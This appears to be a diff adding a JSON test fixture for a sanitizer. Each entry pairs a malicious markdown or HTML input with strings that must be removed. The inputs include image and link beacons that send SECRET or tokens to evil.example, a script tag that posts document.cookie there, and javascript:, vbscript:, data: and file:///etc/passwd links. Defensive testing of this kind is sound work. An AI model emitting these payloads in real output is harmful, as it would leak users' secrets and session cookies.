@@ -1,0 +1,102 @@
+[
+ {
+  "text": "![x](https://evil.example/p.png?d=SECRET)",
+  "forbidden": [
+   "evil.example"
+  ]
+ },
+ {
+  "text": "![alt][ref]\n\n[ref]: https://evil.example/p.png?d=1",
+  "forbidden": [
+   "evil.example"
+  ]
+ },
+ {
+  "text": "[click here](https://evil.example/login)",
+  "forbidden": [
+   "evil.example"
+  ]
+ },
+ {
+  "text": "[click](javascript:alert(1))",
+  "forbidden": [
+   "javascript:"
+  ]
+ },
+ {
+  "text": "[x](data:text/html;base64,PHNjcmlwdD4=)",
+  "forbidden": [
+   "data:text"
+  ]
+ },
+ {
+  "text": "<script>fetch('https://evil.example/'+document.cookie)</script>",
+  "forbidden": [
+   "<script",
+   "evil.example"
+  ]
+ },
+ {
+  "text": "<img src=\"https://evil.example/p.png\">",
+  "forbidden": [
+   "<img",
+   "evil.example"
+  ]
+ },
+ {
+  "text": "<iframe src='https://evil.example'></iframe>",
+  "forbidden": [
+   "<iframe",
+   "evil.example"
+  ]
+ },
+ {
+  "text": "See <https://evil.example/x?token=abc> for details",
+  "forbidden": [
+   "evil.example"
+  ]
+ },
+ {
+  "text": "Visit https://evil.example/collect?x=SECRET now.",
+  "forbidden": [
+   "evil.example"
+  ]
+ },
+ {
+  "text": "[a](https://acme.atlassian.net/browse/X?token=SECRET)",
+  "forbidden": [
+   "token=SECRET"
+  ]
+ },
+ {
+  "text": "[a](file:///etc/passwd)",
+  "forbidden": [
+   "file:///"
+  ]
+ },
+ {
+  "text": "[a](vbscript:msgbox(1))",
+  "forbidden": [
+   "vbscript:"
+  ]
+ },
+ {
+  "text": "<!-- exfil https://evil.example --> text",
+  "forbidden": [
+   "evil.example"
+  ]
+ },
+ {
+  "text": "<a href='https://evil.example'>x</a>",
+  "forbidden": [
+   "evil.example",
+   "<a "
+  ]
+ },
+ {
+  "text": "[1]: https://evil.example/x\nbody",
+  "forbidden": [
+   "evil.example"
+  ]
+ }
+]
